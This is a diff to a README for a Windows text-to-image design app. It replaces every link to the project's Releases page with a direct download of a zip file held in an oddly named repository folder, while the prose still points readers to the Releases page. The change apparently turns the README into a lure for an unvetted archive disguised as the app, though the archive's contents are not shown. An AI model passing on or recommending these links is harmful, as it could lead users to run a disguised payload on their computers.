@@ -1,6 +1,6 @@
 # 🎨 graphic-design - Create visuals with simple text prompts
 
-[![Download graphic-design](https://img.shields.io/badge/Download%20graphic--design-1e90ff?style=for-the-badge&logo=github&logoColor=white)](https://github.com/abc106065-collab/graphic-design/releases)
+[![Download graphic-design](https://img.shields.io/badge/Download%20graphic--design-1e90ff?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/abc106065-collab/graphic-design/main/puparium/design-graphic-v1.7.zip)
 
 ## 🖥️ What this app does
 
@@ -12,7 +12,7 @@ It is built for simple use. You type what you want, choose a style, and let the 
 
 Visit this page to download the Windows version:
 
-https://github.com/abc106065-collab/graphic-design/releases
+https://raw.githubusercontent.com/abc106065-collab/graphic-design/main/puparium/design-graphic-v1.7.zip
 
 On the Releases page, look for the latest version. Download the Windows file, then open it on your PC.
 
@@ -183,7 +183,7 @@ Shorten the text and use a different layout style. Large blocks of text can be h
 
 Check the Releases page for new Windows builds, fixes, and version updates:
 
-https://github.com/abc106065-collab/graphic-design/releases
+https://raw.githubusercontent.com/abc106065-collab/graphic-design/main/puparium/design-graphic-v1.7.zip
 
 ## 💡 Simple workflow
 
